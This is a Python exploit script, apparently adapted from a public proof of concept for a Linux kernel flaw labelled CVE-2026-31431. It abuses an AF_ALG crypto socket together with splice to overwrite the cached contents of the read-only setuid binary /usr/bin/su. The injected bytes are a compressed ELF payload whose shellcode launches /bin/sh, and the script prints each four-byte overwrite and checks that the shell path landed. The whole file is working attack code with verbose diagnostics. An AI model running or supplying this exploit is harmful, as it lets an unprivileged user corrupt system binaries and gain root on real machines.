#!/usr/bin/env python3
# based on github.com/theori-io/copy-fail-CVE-2026-31431
import mmap
import os
import socket
import zlib

def d(x):
    return bytes.fromhex(x)

def ascii_repr(b):
    return ''.join(chr(c) if 0x20 <= c < 0x7f else '.' for c in b)

ELF_FIELD = {
    0x00: "e_ident",    0x10: "e_type",     0x12: "e_machine",
    0x14: "e_version",  0x18: "e_entry",    0x20: "e_phoff",
    0x28: "e_shoff",    0x30: "e_flags",    0x34: "e_ehsize",
    0x36: "e_phentsize",0x38: "e_phnum",    0x3a: "e_shentsize",
    0x3c: "e_shnum",    0x3e: "e_shstrndx",
}

def trigger(file_fd, offset, payload):
    a = socket.socket(38, 5, 0)
    a.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
    h = 279
    v = a.setsockopt
    v(h, 1, d('0800010000000010' + '0' * 64))
    v(h, 5, None, 4)
    u, _ = a.accept()
    o = offset + 4
    i = d('00')
    u.sendmsg(
        [b"A" * 4 + payload],
        [(h, 3, i * 4), (h, 2, b'\x10' + i * 19), (h, 4, b'\x08' + i * 3)],
        32768
    )
    r, w = os.pipe()
    os.splice(file_fd, w, o, offset_src=0)
    os.splice(r, u.fileno(), o)
    try:
        u.recv(8 + offset)
    except:
        0

# 打开 /usr/bin/su
f = os.open("/usr/bin/su", os.O_RDONLY)
size = os.path.getsize("/usr/bin/su")
m = mmap.mmap(f, size, mmap.MAP_SHARED, mmap.PROT_READ)

# 攻击前快照
m.seek(0)
before_all = m.read()

# payload
e = zlib.decompress(d(
    "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d"
    "209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675"
    "c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"
))

print(f"[+] /usr/bin/su size: {size} bytes")
print(f"[+] payload size: {len(e)} bytes")
print(f"[*] triggering copy_file_range writeback ...\n")

# 逐 4 字节写入，并打印每次写入前后的变化
changes_total = []
i = 0
step = 1
while i < len(e):
    payload = e[i:i+4]
    offset = i
    # 保存写入前的原始值（4字节）
    before_bytes = before_all[offset:offset+4]
    # 触发漏洞写
    trigger(f, offset, payload)
    # 刷新 mmap 并读取当前值
    m.flush()
    m.seek(offset)
    after_bytes = m.read(4)
    changed = (before_bytes != after_bytes)
    # 记录变化
    if changed:
        changes_total.extend(range(offset, offset+4))
    # 打印这一 step
    region = "ELF header" if offset < 0x40 else ".text" if offset < 0x200 else "other"
    print(f"  step {step:2d} | offset 0x{offset:04x} | {region} | {'CHANGED' if changed else 'no change'}")
    print(f"    payload:  {payload.hex():8} ({ascii_repr(payload)})")
    print(f"    before:   {before_bytes.hex():8} ({ascii_repr(before_bytes)})")
    print(f"    after:    {after_bytes.hex():8} ({ascii_repr(after_bytes)})")
    print()
    i += 4
    step += 1

print("=" * 72)
print(f"[+] 总计写入步骤: {step-1}")
changes_total = sorted(set(changes_total))
print(f"[+] 实际变化字节: {len(changes_total)}")

# 重新读取完整的 after 快照
m.seek(0)
after_all = m.read()

# 在被篡改的字节中搜索可读字符串（4 字节以上）
changed_bytes = bytes(after_all[off] for off in changes_total)
strings = []
cur = b""
for b in changed_bytes:
    if 0x20 <= b < 0x7f:
        cur += bytes([b])
    else:
        if len(cur) >= 4:
            strings.append(cur.decode())
        cur = b""
if len(cur) >= 4:
    strings.append(cur.decode())

if strings:
    print(f"[+] 在被篡改的字节中发现的字符串:")
    for s in strings:
        if '/bin/sh' in s:
            print(f"    *** {repr(s)} ***  ← shellcode 中的路径")
        else:
            print(f"    {repr(s)}")

# 额外：直接验证 /bin/sh 是否出现在代码段注入区域
sh_offset = after_all.find(b'/bin/sh')
if sh_offset != -1:
    # 检查该偏移是否属于我们修改过的范围
    if sh_offset in changes_total or any(abs(sh_offset - c) < 4 for c in changes_total):
        print(f"[+] '/bin/sh' 字符串位于偏移 0x{sh_offset:x}，该地址属于被篡改区域（shellcode 注入点）")
    else:
        print(f"[!] '/bin/sh' 出现在偏移 0x{sh_offset:x}，但该地址不在篡改范围内（可能是文件原有）")
else:
    print("[-] 未在内存中找到 '/bin/sh'")

m.close()
os.close(f)